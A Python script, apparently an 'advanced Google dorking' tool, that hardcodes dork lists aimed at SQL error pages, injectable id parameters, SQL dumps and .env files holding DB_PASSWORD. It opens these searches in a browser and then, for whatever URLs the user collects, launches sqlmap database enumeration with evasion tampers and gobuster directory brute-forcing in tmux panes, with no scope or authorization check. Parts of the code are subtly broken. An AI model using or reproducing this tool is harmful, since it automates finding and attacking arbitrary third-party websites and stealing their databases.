#!/usr/bin/env python3
"""
Advanced Google Dorking and Security Testing Tool
A comprehensive script for automated dork collection and security testing setup
"""

import subprocess
import sys
import os
import requests
from bs4 import BeautifulSoup
import webbrowser
import time
from urllib.parse import quote_plus
from urllib.parse import urlparse

class SecurityToolsManager:
    """Manages installation and verification of security tools"""
    
    def __init__(self):
        self.required_tools = {
            'sqlmap': 'sqlmap',
            'gobuster': 'gobuster', 
            'seclists': '/usr/share/seclists'
        }
    
    def check_tool_installed(self, tool_name, check_path=None):
        """Check if a specific tool is installed on the system"""
        try:
            if check_path and os.path.exists(check_path):
                return True
            elif not check_path:
                result = subprocess.run(['which', tool_name], 
                                      capture_output=True, text=True)
                return result.returncode == 0
            return False
        except Exception as e:
            print(f"Error checking {tool_name}: {e}")
            return False
    
    def install_tool(self, tool_name):
        """Install a specific security tool using apt"""
        try:
            print(f"Installing {tool_name}...")
            if tool_name == 'seclists':
                subprocess.run(['sudo', 'apt', 'update'], check=True)
                subprocess.run(['sudo', 'apt', 'install', '-y', 'seclists'], check=True)
            else:
                subprocess.run(['sudo', 'apt', 'update'], check=True)
                subprocess.run(['sudo', 'apt', 'install', '-y', tool_name], check=True)
            print(f"{tool_name} installed successfully!")
            return True
        except subprocess.CalledProcessError as e:
            print(f"Failed to install {tool_name}: {e}")
            return False
    
    def verify_and_install_tools(self):
        """Check and install all required security tools"""
        print("Checking required security tools...")
        
        for tool, check_item in self.required_tools.items():
            if tool == 'seclists':
                is_installed = self.check_tool_installed(tool, check_item)
            else:
                is_installed = self.check_tool_installed(check_item)
            
            if is_installed:
                print(f"✓ {tool} is already installed")
            else:
                print(f"✗ {tool} not found, installing...")
                if not self.install_tool(tool):
                    print(f"Failed to install {tool}. Please install manually.")
                    return False
        
        print("All required tools are ready!")
        return True



class DorkCollector:
    """Handles collection of Google dorks from exploit-db"""
    
    def __init__(self):
        self.base_url = "https://www.exploit-db.com/google-hacking-database"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
    
    def fetch_dorks(self):

        print("Select which type of Google Dork do you want to use")
        print("[1] Google Dorks returning SQL-injection errors")
        print("[2] Google Dorks returning pages with potentially injectable parameters")
        print("[all] Both types of Google Dorks")

        choice = input("Your choice: ").strip().lower()

        dorks_error = [
            'inurl:"index.php?id=" intext:"Warning: mysql_num_rows()"',
            'inurl:".php?id=" "You have an error in your SQL syntax"',
            'inurl:"id=" intext:"MySQL Error: 1064" "Session halted."',
            'inurl:index.php?id= intext:"mysql_fetch_array"',
            'inurl:advsearch.php?module= intext:sql syntax',
            '"Warning: mysql_connect(): Access denied for user" "on line" -help -forum',
            '"Unable to jump to row" "on MySQL result index" "on line"',
            'filetype:asp "[ODBC SQL"',
            '"[SQL Server Driver][SQL Server]Line 1: Incorrect syntax near" -forum -thread',
            '"Warning: mysql_query()" "invalid query"',
            '"Warning: pg_connect(): Unable to connect to PostgreSQL server: FATAL"',
            '"Supplied argument is not a valid PostgreSQL result"',
            '"PostgreSQL query failed: ERROR: parser: parse error"',
            '"ORA-00933: SQL command not properly ended"',
            '"ORA-00921: unexpected end of SQL command"',
            '"Supplied argument is not a valid MySQL result resource"',
            '"You have an error in your SQL syntax near"',
            '"mySQL error with query"',
            '"ORA-00921: unexpected end of SQL command"'
            '"supplied argument is not a valid MySQL result resource"'            
        ]

        dorks_parameter = [
            'inurl:index.php?id=',
            'inurl:index.asp?id=',            
            'inurl:.php?id=',
            'inurl:.asp?id=',
            '"You have an error in your SQL syntax"',
            'intext:"select * from"',
            '"Warning: mysql_fetch_array() expects parameter 1"',
            'inurl:".php?cat="',
            'inurl:".asp?cat="',            
            'filetype:sql "sql backup"',
            '"ORA-00933: SQL command not properly ended"',
            'inurl:product.php?id=',
            'inurl:product.asp?id=',
            'inurl:page.php?id=',
            'inurl:page.asp?id=',            
            'inurl:view.php?id=',
            'inurl:view.asp?id=',            
            'inurl:.php?id= intext:"mysql"',
            'inurl:.asp?id= intext:"mysql"',            
            'inurl:search.php?q=',
            'inurl:search.asp?q=',            
            'filetype:sql inurl:dump',
            'filetype:env "DB_PASSWORD"',
            'filetype:sql "backup"'
        ]

        if choice == "1":
            dorks = dorks_error
        elif choice == "2":
            dorks = dorks_parameter
        elif choice == "all":
            dorks = dorks_error + dorks_parameter
        else:
            print("Invalid choice, defaulting to ALL dorks")
            dorks = dorks_error + dorks_parameter
        return dorks
            



class UserInterface:
    """Handles user interaction and input validation"""
    
    @staticmethod
    def display_dorks(dorks):
        """Display collected dorks with numbered list"""
        print("Collected Google Dorks:")
        print("-" * 50)
        
        for i, dork in enumerate(dorks, 1):
            print(f"[{i}] {dork}")
        
        print(f"\n[all] Use all {len(dorks)} dorks")
        return len(dorks)
    
    @staticmethod
    def get_dork_selection(max_number):
        """Get user's dork selection (supports comma-separated values or 'all')"""
        while True:
            try:
                selection = input(
                    f"\nSelect dork numbers (1-{max_number}), comma-separated, or 'all': "
                ).strip().lower()

                if selection == 'all':
                    return 'all'

                parts = [p.strip() for p in selection.split(',')]

                if not parts:
                    raise ValueError

                indices = []
                for part in parts:
                    if not part.isdigit():
                        raise ValueError

                    num = int(part)
                    if not (1 <= num <= max_number):
                        raise ValueError

                    indices.append(num - 1)

                indices = list(dict.fromkeys(indices))

                return indices

            except ValueError:
                print(
                    f"Please enter valid numbers between 1 and {max_number}, "
                    "separated by commas, or 'all'"
                )
            except KeyboardInterrupt:
                print("\nOperation cancelled by user")
                sys.exit(0)

    
    @staticmethod
    def get_search_topic():
        """Get search topic from user"""
        while True:
            topic = input("Enter search topic (e.g., 'demons and saints', 'food', etc.): ").strip()
            if topic:
                return topic
            print("Please enter a valid search topic")
    
    @staticmethod
    def get_urls():
        """Collect URLs from user input"""
        urls = []
        print("Enter URLs to analyze (press Enter with empty line to finish):")
        
        while True:
            url = input("URL: ").strip()
            if not url:
                break
            
            # Basic URL validation
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            
            urls.append(url)
            print(f"Added: {url}")
        
        return urls

class BrowserAutomation:
    """Handles automated browser operations"""
    
    @staticmethod
    def open_google_searches(dorks, topic):
        """Open Google searches in browser tabs"""
        print(f"Opening browser with Google searches for topic: '{topic}'")
        
        base_google_url = "https://www.google.com/search?q="
        
        for i, dork in enumerate(dorks, 1):
            # Construct search query: +"topic" + dork
            search_query = f'intext:"{topic}" {dork}'
            encoded_query = quote_plus(search_query)
            full_url = base_google_url + encoded_query
            
            print(f"Opening tab {i}: {search_query}")
            webbrowser.open_new_tab(full_url)
            time.sleep(1)  # Small delay to avoid overwhelming the browser

class TmuxManager:
    """Manages tmux session and window operations"""
    
    def __init__(self, session_name="security_testing"):
        self.session_name = session_name
    
    def create_session(self):
        """Create new tmux session"""
        try:
            # Kill existing session if it exists
            subprocess.run(['tmux', 'kill-session', '-t', self.session_name], 
                          capture_output=True)
            
            # Create new session
            subprocess.run(['tmux', 'new-session', '-d', '-s', self.session_name], 
                          check=True)
            print(f"Created tmux session: {self.session_name}")
            return True
        except subprocess.CalledProcessError as e:
            print(f"Error creating tmux session: {e}")
            return False


    def clean_url(url: str) -> str:
        parsed = urlparse(url)

        scheme = parsed.scheme or "https"
        netloc = parsed.netloc

        # Gestisce URL tipo "https:/example.org"
        if not netloc and parsed.path:
            netloc = parsed.path
            scheme = "https"

        return f"{scheme}://{netloc}"

    
    def setup_url_testing(self, urls):
        if not urls:
            print("No URLs provided for testing")
            return

        print(f"Setting up tmux windows for {len(urls)} URLs...")

        for i, url in enumerate(urls):
            host = TmuxManager.clean_url(url)

            subprocess.run(['tmux','new-window','-t',self.session_name,'-n',host.replace('.','_')])
            target = f"{self.session_name}:{i+1}"

            # Pane 0 (sqlmap base)
            pane_sqlmap = subprocess.check_output(
                ['tmux','display-message','-p','-t',target,'#{pane_id}']
            ).decode().strip()

            sqlmap_cmd = f'sqlmap -u "{url}" --force-ssl --random-agent --tamper=space2comment --batch --dbs'
            subprocess.run(['tmux','send-keys','-t',pane_sqlmap,sqlmap_cmd])

            # Split bottom → gobuster
            pane_gobuster = subprocess.check_output(
                ['tmux','split-window','-v','-t',pane_sqlmap,'-P','-F','#{pane_id}']
            ).decode().strip()

            gobuster_cmd = f'gobuster dir -u {host} -x asp -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt'
            subprocess.run(['tmux','send-keys','-t',pane_gobuster,gobuster_cmd])

            # Split right → sqlmap crawl (ALTO A DESTRA, SEMPRE)
            pane_crawl = subprocess.check_output(
                ['tmux','split-window','-h','-t',pane_sqlmap,'-P','-F','#{pane_id}']
            ).decode().strip()

            sqlmap_crawl = f'sqlmap -u "{url}" --force-ssl --random-agent --tamper=space2comment --batch --crawl=2 --dbs'
            subprocess.run(['tmux','send-keys','-t',pane_crawl,sqlmap_crawl])

            subprocess.run(['tmux','select-layout','-t',target,'tiled'])

            print(f"✓ Setup window for host: {host}")




    
    def attach_session(self):
        """Attach to the tmux session"""
        try:
            subprocess.run(['tmux', 'attach-session', '-t', self.session_name])
        except subprocess.CalledProcessError as e:
            print(f"Error attaching to tmux session: {e}")

def main():
    """Main program execution"""
    print("=" * 60)
    print("ADVANCED GOOGLE DORKING AND SECURITY TESTING TOOL")
    print("=" * 60)
    
    try:
        # Step 1: Verify and install required tools
        print("\n[STEP 1] Checking and installing required tools...")
        tools_manager = SecurityToolsManager()
        if not tools_manager.verify_and_install_tools():
            print("Failed to setup required tools. Exiting.")
            sys.exit(1)
        
        # Step 2: Collect Google dorks
        print("\n[STEP 2] Collecting Google dorks from database...")
        dork_collector = DorkCollector()
        dorks = dork_collector.fetch_dorks()
        
        if not dorks:
            print("No dorks collected. Exiting.")
            sys.exit(1)
        
        # Step 3: Display dorks and get user selection
        print("\n[STEP 3] Displaying collected dorks...")
        ui = UserInterface()
        max_dorks = ui.display_dorks(dorks)
        selection = ui.get_dork_selection(max_dorks)

        if selection == 'all':
            selected_dorks = dorks
            print(f"Selected all {len(dorks)} dorks")
        else:
            selected_dorks = [dorks[i] for i in selection]

            print(f"Selected {len(selected_dorks)} dorks:")
            for d in selected_dorks:
                print(f" - {d}")


        
        # Step 4: Get search topic
        print("\n[STEP 4] Getting search topic...")
        topic = ui.get_search_topic()
        
        # Step 5: Open browser searches
        print("\n[STEP 5] Opening Google searches in browser...")
        browser = BrowserAutomation()
        browser.open_google_searches(selected_dorks, topic)
        
        # Step 6: Collect URLs for testing
        print("\n[STEP 6] Collecting URLs for security testing...")
        urls = ui.get_urls()
        
        if not urls:
            print("No URLs provided. Skipping security testing setup.")
            return
        
        # Step 7: Setup tmux environment
        print("\n\033[1m[STEP 7] Setting up tmux testing environment...\033[0m")
        tmux_manager = TmuxManager()
        
        if tmux_manager.create_session():
            tmux_manager.setup_url_testing(urls)
            print(f"✓ Security testing environment ready!")
            print(f"✓ {len(urls)} URLs configured for testing")
            print(f"✓ Each URL has SQLMap and Gobuster windows")
            print(f"\nAttaching to tmux session '{tmux_manager.session_name}'...")
            print("Use 'Ctrl+b' then 'w' to show all windows")
            print("Use 'Ctrl+b' then 'd' to detach from session")
            print("Use 'Ctrl+b' then ':kill-session' to kill tmux session")
            choice = input("press enter to continue: ").strip().lower()
            
            # Attach to tmux session
            tmux_manager.attach_session()
        
    except KeyboardInterrupt:
        print("\n\nOperation cancelled by user")
        sys.exit(0)
    except Exception as e:
        print(f"\nUnexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
